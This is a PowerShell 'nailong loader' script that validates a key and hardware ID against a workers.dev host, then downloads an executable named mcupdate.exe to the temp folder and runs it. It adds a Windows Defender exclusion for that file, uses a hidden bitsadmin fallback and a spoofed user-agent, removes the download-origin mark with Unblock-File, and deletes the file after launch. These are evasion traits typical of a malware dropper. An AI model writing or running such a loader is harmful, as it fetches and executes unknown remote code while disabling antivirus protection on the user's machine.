# nailong loader -- key gated, resilient download
 $worker = "https://nailong.cync911.workers.dev"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName Microsoft.VisualBasic
Add-Type -AssemblyName System.Windows.Forms

function Show-Err($msg) {
    [System.Windows.Forms.MessageBox]::Show($msg, "nailong") | Out-Null
    exit
}

try {
    $key = [Microsoft.VisualBasic.Interaction]::InputBox("enter your nailong key:", "nailong", "")
    if (-not $key) { exit }
    $key = $key.Trim().ToUpper()

    # hwid
    $uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = [BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($uuid))).Replace("-","").ToLower()
    $hwid = $hash.Substring(0,32)

    # validate
    $resp = Invoke-RestMethod "$worker/check?key=$key&hwid=$hwid" -ErrorAction Stop

    if ($resp.status -ne "ok") {
        $msg = switch ($resp.status) {
            "invalid_key"    { "invalid key." }
            "expired"        { "key expired. renew please." }
            "hwid_mismatch"  { "key is locked to another pc." }
            default          { "rejected: $($resp.status)" }
        }
        Show-Err $msg
    }

    # download -- try .NET webclient, fallback to bitsadmin
    $dst = "$env:TEMP\mcupdate.exe"
    Add-MpPreference -ExclusionPath $dst -ErrorAction SilentlyContinue

    $url = "$worker/download?key=$key&hwid=$hwid"

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dst)
    } catch {
        # fallback 1: Invoke-WebRequest
        try {
            Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
        } catch {
            # fallback 2: bitsadmin
            $bits = Start-Process bitsadmin -ArgumentList "/transfer nljob `"$url`" `"$dst`"" -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
            if (-not (Test-Path $dst)) {
                Show-Err "download failed. error: $($_.Exception.Message)"
            }
        }
    }

    if (-not (Test-Path $dst)) { Show-Err "download failed -- file missing." }
    if ((Get-Item $dst).Length -lt 100000) { Show-Err "download incomplete -- try again." }

    Unblock-File $dst -ErrorAction SilentlyContinue
    Start-Process $dst
    Start-Sleep 5
    Remove-Item $dst -Force -ErrorAction SilentlyContinue
} catch {
    Show-Err "connection failed. details: $($_.Exception.Message)"
}
